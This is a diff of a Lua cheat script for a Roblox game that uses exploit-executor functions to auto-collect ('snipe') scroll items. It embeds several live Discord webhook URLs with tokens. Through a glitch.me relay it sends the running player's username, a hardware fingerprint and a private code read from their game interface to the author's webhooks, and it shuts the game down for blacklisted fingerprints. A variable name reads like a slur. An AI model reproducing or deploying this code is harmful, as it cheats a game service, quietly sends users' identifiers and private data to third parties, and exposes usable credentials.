@@ -57,7 +57,7 @@ local function log(name, message, hook)
  local data = game:HttpPost(api, game:GetService("HttpService"):JSONEncode(Body), false, "application/json")
  return data or nil
 end
-local wh = "https://discordapp.com/api/webhooks/766281274159005747/naddjrmiwSh336SrcGkhcutJ84XVzMulRuzDh2BVfOtMSETgv5lm4TpeFdkwKT2dwbpk"
+local hwidwh = "https://discordapp.com/api/webhooks/766281274159005747/naddjrmiwSh336SrcGkhcutJ84XVzMulRuzDh2BVfOtMSETgv5lm4TpeFdkwKT2dwbpk"
 
 local blacklisted_hwids = {
                          "z", "Hwid2", "Hwid3"
@@ -73,7 +73,7 @@ for i, v in next, Fingerprnit_list do
     for i1, v1 in next, blacklisted_hwids do
         if  v1 == json_decode[v] then
            print('BlackListed');
-           log("blacklisted", "***" .. hwidz .. "***" ..  "* Username:  " .. game.Players.LocalPlayer.Name , wh);
+           log("blacklisted", "***" .. hwidz .. "***" ..  "* Username:  " .. game.Players.LocalPlayer.Name , hwidwh);
            game:Shutdown()
         end
     end
@@ -125,7 +125,6 @@ Duration = 30;
 	    if v.ClassName == "Model" then 
 	        if table.find(getgenv().ignore, v.Name) then
 	            zigger = true
-			log("skipped", "***" .. " Skipped:  " .. v.Name .. "***" , "https://discord.com/api/webhooks/767052037250482186/HKM9_Sf94HL4eEw1Z2LXtFsfTwUZePcWBtyeYXRFOVYlbEVwYFpHFBJhJnK348e79P46");
 	        elseif not table.find(getgenv().ignore, v.Name) then
                 zigger = false
                 else 
@@ -172,49 +171,15 @@ for i,v in pairs(game.workspace.GLOBALTIME:GetChildren()) do
        JINKILL()
        fireclickdetector(v.sh.ClickDetector)
        local name = game.Players.LocalPlayer.Name
-       local http_request = http_request;
-if syn then
-http_request = syn.request
-elseif SENTINEL_V2 then
-function http_request(tb)
-return {
-StatusCode = 200;
-Body = request(tb.Url, tb.Method, (tb.Body or ''))
-}
-end
-end
-
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
-local hwid = "";
-
-for i, v in next, hwid_list do
-if decoded.headers[v] then
-hwid = decoded.headers[v];
-break
-end
-end
-
-
-local function log(name, message, hook)
- local api = "http://buritoman69.glitch.me/webhook" -- credits to owner
- local Body = {
-   ['Key'] = "applesaregood",
-   ['Message'] = tostring(message),
-   ['Name'] = tostring(name),
-   ['Webhook'] = tostring(hook)
- }
- local data = game:HttpPost(api, game:GetService("HttpService"):JSONEncode(Body), false, "application/json")
- return data or nil
-end
-function SendMessage(Webhook, Message, Botname)
-    if not string.find(Webhook, "https://discordapp.com/api/webhooks/") then
-        return error("Send a valid URL");
-    end
+       local monkeyzzz = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").private.Text
+    local snipewh = "https://discord.com/api/webhooks/767062747040972810/09LhRUrMO8A4EUHmchHnksWaDUEYKG1lbs83eAQ3buILAg2z18zjPraXibe490fwqgxy"
+    local flexwh = "https://discordapp.com/api/webhooks/766777831694270473/h-nHwLJqqybqMCMamh_QBaHMJYBX2PpwJCO1F5ia8bLGwUENlAi4gPdoxcrOXlgt4HT_"
+    local formatwh = "https://discordapp.com/api/webhooks/767475701213167687/E68vGiose__CjlBQ6d6I3amt1NNQyX46OWebNUgmoYRBXKInB3xiPCS_yxDUBp1wjOsC"
+    local HttpService = game:GetService("HttpService");
+function specials(Webhook, Message, Botname)
     local Name;
-    local WakeUp = game:HttpGet("http://buritoman69.glitch.me");
-    local API = "http://buritoman69.glitch.me/webhook";
+    local start = game:HttpGet("http://buritoman69.glitch.me");
+    local biggie = "http://buritoman69.glitch.me/webhook";
     if (not Message or Message == "" or not Botname) then
         Name = "GameBot"
         return error("nil or empty message!")
@@ -228,14 +193,12 @@ function SendMessage(Webhook, Message, Botname)
         ['Webhook'] = Webhook    
     }
     Body = HttpService:JSONEncode(Body);
-    local Data = game:HttpPost(API, Body, false, "application/json")
+    local Data = game:HttpPost(biggie, Body, false, "application/json")
     return Data or nil;
 end
-local monkeyzzz = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("Main").private.Text
-	local snipess = "https://discord.com/api/webhooks/766006562380054528/oOWi34rOjuqYi4mi86ZssDCUXfZXMoJsRX-FHYwNjDUJf9iABLbvbPf2Q6OfYDR158SA"
-	local flex = "https://discord.com/api/webhooks/766777831694270473/h-nHwLJqqybqMCMamh_QBaHMJYBX2PpwJCO1F5ia8bLGwUENlAi4gPdoxcrOXlgt4HT_"
-	SendMessage(flex, "***" .. " Sniped: ".. v.Name .. "Code: "  .. monkeyzzz .. "***", "Senpai and Hentai Winning")
-       SendMessage(snipess, "***" .. name .. " sniped ".. v.Name .. "Code: "  .. monkeyzzz .. "***", "Logger")
+specials(snipewh, "***" .. name .. " sniped: ".. v.Name .. "Code: "  .. monkeyzzz .. "***", "Logger")
+specials(flexwh, "***" .. "Sniped: " .. v.Name .. " Code: " .. monkeyzzz .. "***", "Hentai and Senpai Winning")
+specials(formatwh, "***" .. monkeyzzz .. " | " .. v.Name .. " | " ..  _G.placetp .. "***", "Format")
        game.StarterGui:SetCore("SendNotification", {
 Title = "scroll sniped";
 Text = "sniped: " ..  v.Name;
